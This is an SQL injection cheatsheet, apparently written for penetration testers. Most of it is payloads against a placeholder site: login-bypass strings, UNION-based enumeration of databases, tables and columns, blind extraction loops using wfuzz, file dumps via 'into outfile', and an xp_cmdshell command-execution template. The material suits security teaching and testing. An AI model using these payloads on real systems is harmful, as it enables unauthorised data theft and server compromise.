(Thank you [@numonce](https://github.com/numonce))

>[!info]
>This guide would be entirely too long if the goal were to teach SQL, so instead it will be be broken down to detection and cheetsheet. 


SQL injection is a web security vulnerability that allows an attacker to **interfere** with the **queries** that an application makes to its **database**. It generally allows an attacker to **view data** that they are not normally able to retrieve. This might include data belonging to **other users**, or any other data that the **application** itself is able to **access**. In many cases, an attacker can **modify** or **delete** this data, causing persistent changes to the application's content or behavior. In some situations, an attacker can escalate an SQL injection attack to **compromise the underlying server** or other back-end infrastructure.

### Entry point detection
---

You may have found a site that is **apparently vulnerable to SQL**i just because the server is behaving weird with SQLi related inputs. Therefore, the **first thing** you need to do is how to **inject data in the query without breaking it.** To do so you first need to find how to **escape from the current context.** These are some useful examples:
```
 [Nothing]
'
"
`
')
")
`)
'))
"))
`))
```

Then, you need to know how to **fix the query so there isn't errors**. In order to fix the query you can **input** data so the **previous query accept the new data**, or you can just **input** your data and **add a comment symbol add the end**.

```php
# Backend Code
select * from users where name = 'tom' and password = 'jones';

# Injection: tom' or 1=1;#

# Authentication Bypass
select * from users where name = 'tom' or 1=1;#' and password = 'jones';
```

This cheatsheet should NOT be considered as reference but guide to built on, some of the examples below will require modification(s) such as url encode, comments, etc. Before we continue here is couple good to know SQL functions

```php
limit <row offset>,<number of rows>                          # display rows based on offset and number  

count(*)                                                     # display number of rows  

rand()                                                       # generate random number between 0 and 1 

floor(rand()*<number>)                                       # print out number part of random decimal number 

select(select database());                                   # double query (nested) using database() as an example 

group by <column name>                                       # summerize rows based on column name  

concat(<string1>, <string2>, ..)                             # concatenate strings such as tables, column names  

length(<string>)                                             # calculate the number of characters for given string 

substr(<string>,<offset>,<characters length>)                # print string character(s) by providing offset and length 

ascii(<character>)                                           # decimal representation of the character 

sleep(<number of seconds>)                                   # go to sleep for <number of seconds>

if(<condition>,<true action>,<false action>)                 # conditional if statement 

like "<string>%"                                             # checks if provided string present

outfile "<url to file>"                                      # dump output of select statement into a file

load_file("<url to file>")                                   # dump the content of file
```

Now comes the fun part, here's combination of error, union, blind SQL command injection examples.

Determine back-end query number of columns with error-based string SQL command injection
```php
http://meh.com/index.php?id=1 order by <number>
```

Determine back-end query number of columns by observing `http response size` with `wfuzz` in error-based integer SQL command injection
```php
wfuzz -c -z range,1-10 "http://meh.com/index.php?id=1 order by FUZZ"
```

Identify webpage printable union columns by providing false value to back-end query with error-based integer SQL command injection. This injection depends on number of columns identified by `order by` clause
```php
http://meh.com/index.php?id=-1 union select <number of columns seperated by comma>
```

Dump the content of table into the filesystem
```php
http://meh.com/index.php?id=-1')) union select <column1>,<column2> from <table name> into outfile "<url to file>" --+
```

Print back-end SQL version with error-based integer SQL command injection, assuming column 3 content gets diplayed on webpage
```php
http://meh.com/index.php?id=-1 union select 1,2,@@version,4,...
```

Print user running the query to access back-end database server with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,user(),4,...
```

Print database name with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,database(),4,...
```

Print database directory with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,@@datadir,4,...
```

Print table names with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(table_name),4,... from information_schema.tables where table_schema=database()
```

Print column names with error-based integer SQL command injection
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(column_name),4,... from information_schema.columns where table_name='<table name>'
```

Print content of column with error-based integer SQL command injection 
```php
http://meh.com/index.php?id=-1 union select 1,2,group_concat(<column name>),4,... from <table name>
```

Use `and` statement as substitute to reqular comments such as `--+`, `#`, and `/* */` with error-based string SQL command injection
```php
http://meh.com/index.php?id=1' <sqli here> and '1
```
Determine database name with boolean-based blind SQL injection with `substr()`
```php
http://meh.com/index.php?id=1' and (substr(database(),<offset>,<character length>))='<character>' --+
```

Determine database name with boolean-based blind SQL injection by observing `http response size` with combination of `substr()` and `wfuzz`, assuming database name does not include special characters
```php
for i in $(seq 1 10); do wfuzz -c -z list,a-b-c-d-e-f-g-h-i-j-k-l-m-n-o-p-q-r-s-t-u-v-w-x-y-z --hw=<word count> "http://meh.com/index.php?id=1' and (substr(database(),$i,1))='FUZZ' --+";done 
```
Determine database name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()` and `wfuzz`. The below range is the standard ASCII characters (32-127) 
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr(database(),$i,1)))=FUZZ --+";done 
```

Determine table name with boolean-based blind SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127) 
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available table name 
```

Determine column name with boolean blind-based SQL injection by observing `http response size` with `substr()`, `ascii()`, and `wfuzz`. The below range is the standard ASCII characters (32-127) 
```php
for i in $(seq 1 10); do wfuzz -c -z range,32-127 --hw=<word count> "http://meh.com/index.php?id=1' and (ascii(substr((select column_name from information_schema.columns where table_name=<table name> limit 0,1),$i,1)))=FUZZ --+";done # increment limit first argument by 1 to get the next available column name 
```
Boolean-based blind SQL command injection demo

![alt text](https://j.gifs.com/W77p8o.gif)

Confirm time-based blind SQL injection using `sleep()` function
```php
http://meh.com/index.php?id=1' and sleep(10) --+
```

Determine database version with time-based blind SQL injection using `sleep()`, `like""`, and conditional `if`, assuming the back-end database is running version 5
```php
http://meh.com/index.php?id=1' and if((select version()) like "5%", sleep(10), null) --+
```

Determine database name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((ascii(substr(database(),$i,1)))=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt>
```

Determine table name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(table_name,$i,1))from information_schema.tables where table_schema=database() limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available table name 
```
Determine column name with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,32-127 "http://meh.com/index.php?id=1' and if((select ascii(substr(column_name,$i,1))from information_schema.columns where table_name='<table name>' limit 0,1)=FUZZ, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # increment limit first argument by 1 to get the next available column name 
```

Extract column content with time-based blind SQL injection by observing `http response time` with `substr()`, `ascii()`, `if`, and `wfuzz`.The below range is the standard ASCII characters (32-127)
```php
for i in $(seq 1 10); do wfuzz -v -c -z range,0-10 -z range,32-127 "http://meh.com/index.php?id=1' and if(ascii(substr((select <column name> from <table name> limit FUZZ,1),$i,1))=FUZ2Z, sleep(10), null) --+";done > <filename.txt> && grep "0m9" <filename.txt> # change <column name> to get the content of next column
```
Time-based blind SQL command injection with bash magic demo

![alt text](https://j.gifs.com/2vv2J1.gif)

Hope those were helpfull! Now here's couple login bypass commands that worked for me
```php
meh' OR 3=3;#
meh' OR 2=2 LIMIT 1;#
meh' OR 'a'='a
meh' OR 1=1 --+
```
Sometimes you'll run into Microsoft SQL server that have `xp_cmdshell` turned on, here's syntax for remote code execution
```php
meh' exec master..xp_cmdshell '<command here>' --
```
